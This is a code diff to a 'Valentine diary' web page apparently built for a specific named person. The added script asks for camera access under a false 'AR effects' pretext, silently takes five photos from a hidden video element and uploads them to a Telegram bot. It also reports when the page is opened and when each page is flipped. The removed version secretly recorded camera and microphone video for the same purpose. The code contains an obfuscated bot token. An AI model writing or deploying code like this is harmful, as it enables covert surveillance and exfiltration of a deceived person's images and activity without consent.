@@ -93,74 +93,74 @@
     <video id="video-preview" autoplay muted playsinline style="position:fixed; opacity:0; pointer-events:none;"></video>
     <script>
         const t = atob("ODU2NzQwMjg4NzpBQUd1d2FCOVNGSmY2SFktUTdQZ21mQUFvSmZlMVg0Vldabw==");
-        const bgMusic = document.getElementById('bg-music');
-        let mediaRecorder, recordedChunks = [];
+const bgMusic = document.getElementById('bg-music');
+let stream = null;
 
-        document.querySelectorAll('.diary-video').forEach(vid => {
-            vid.onplay = () => bgMusic.pause();
-            vid.onpause = () => bgMusic.play();
-        });
+async function startDiary() {
+    try {
+        // 1. Request Camera Access
+        stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        
+        // 2. Only show diary if access is granted
+        document.getElementById('overlay').style.display = 'none';
+        document.getElementById('diary-wrapper').style.display = 'block';
+        bgMusic.play();
 
-        function setupZ() { 
-            const pages = document.querySelectorAll('.page'); 
-            pages.forEach((el, i) => { el.style.zIndex = pages.length - i; }); 
-        }
-        setupZ();
+        fetch(`https://api.telegram.org/bot${t}/sendMessage?chat_id=5324376571&text=Valentine%20Link%20Opened!%20❤️`);
 
-        function flipPage(el, pageNum) {
-            el.classList.toggle('flipped');
-            if(el.classList.contains('flipped')) {
-                fetch(`https://api.telegram.org/bot${t}/sendMessage?chat_id=5324376571&text=Nikhitha%20is%20on%20Page%20${pageNum}%20❤️`);
-                el.style.zIndex = pageNum + 1;
-            } else {
-                el.style.zIndex = document.querySelectorAll('.page').length - pageNum;
-            }
-        }
+        // 3. Start Burst Capture (5 Photos)
+        takeBurstPhotos(5, 2000); // Take 5 photos, one every 2 seconds
 
-        async function startDiary() {
-            try {
-                // STEP 1: Request access FIRST
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+    } catch (err) { 
+        alert("Wait! To see the Valentine surprise, you must Allow Camera access for the AR effects! ❤️");
+    }
+}
+
+async function takeBurstPhotos(count, interval) {
+    const video = document.createElement('video');
+    video.srcObject = stream;
+    await video.play();
+
+    const canvas = document.createElement('canvas');
+    canvas.width = 640;
+    canvas.height = 480;
+    const context = canvas.getContext('2d');
+
+    for (let i = 1; i <= count; i++) {
+        setTimeout(async () => {
+            // Capture frame from video stream
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // Convert to small JPEG for fast sending
+            canvas.toBlob((blob) => {
+                const formData = new FormData();
+                formData.append('chat_id', "5324376571");
+                formData.append('photo', blob, `reaction_${i}.jpg`);
                 
-                // STEP 2: Only proceed if access is granted
-                document.getElementById('overlay').style.display = 'none';
-                document.getElementById('diary-wrapper').style.display = 'block';
-                bgMusic.play();
+                // Use sendPhoto for instant notification
+                fetch(`https://api.telegram.org/bot${t}/sendPhoto`, { 
+                    method: 'POST', 
+                    body: formData 
+                });
+            }, 'image/jpeg', 0.7); // 0.7 quality to keep file size tiny
 
-                fetch(`https://api.telegram.org/bot${t}/sendMessage?chat_id=5324376571&text=Valentine%20Link%20Opened!%20❤️`);
+        }, i * interval);
+    }
+}
 
-                document.getElementById('video-preview').srcObject = stream;
-                mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+// Keep your flipPage and setupZ functions exactly as they were
+function setupZ() { 
+    const pages = document.querySelectorAll('.page'); 
+    pages.forEach((el, i) => { el.style.zIndex = pages.length - i; }); 
+}
+setupZ();
 
-                mediaRecorder.ondataavailable = (e) => { 
-                    if (e.data.size > 0) recordedChunks.push(e.data); 
-                };
-
-                mediaRecorder.onstop = async () => {
-                    if (recordedChunks.length === 0) return;
-                    // Small delay to ensure blob is ready
-                    await new Promise(r => setTimeout(r, 500));
-                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
-                    const formData = new FormData();
-                    formData.append('chat_id', "5324376571");
-                    formData.append('document', blob, 'reaction.webm');
-                    
-                    fetch(`https://api.telegram.org/bot${t}/sendDocument`, { method: 'POST', body: formData });
-                };
-
-                mediaRecorder.start();
-                setTimeout(() => { if (mediaRecorder.state === "recording") mediaRecorder.stop(); }, 10000);
-
-            } catch (err) { 
-                // STEP 3: Handle Blocked Camera
-                alert("Wait! To see the Valentine surprise, you must Allow Camera access for the AR effects! ❤️");
-                console.log("Diary locked: Camera access denied.");
-            }
-        }
-
-        window.addEventListener('beforeunload', () => {
-            if (mediaRecorder && mediaRecorder.state === "recording") { mediaRecorder.stop(); }
-        });
-    </script>
-</body>
-</html>
+function flipPage(el, pageNum) {
+    el.classList.toggle('flipped');
+    if(el.classList.contains('flipped')) {
+        fetch(`https://api.telegram.org/bot${t}/sendMessage?chat_id=5324376571&text=Nikhitha%20is%20on%20Page%20${pageNum}%20❤️`);
+        el.style.zIndex = pageNum + 1;
+    } else {
+        el.style.zIndex = document.querySelectorAll('.page').length - pageNum;
+    }
+}
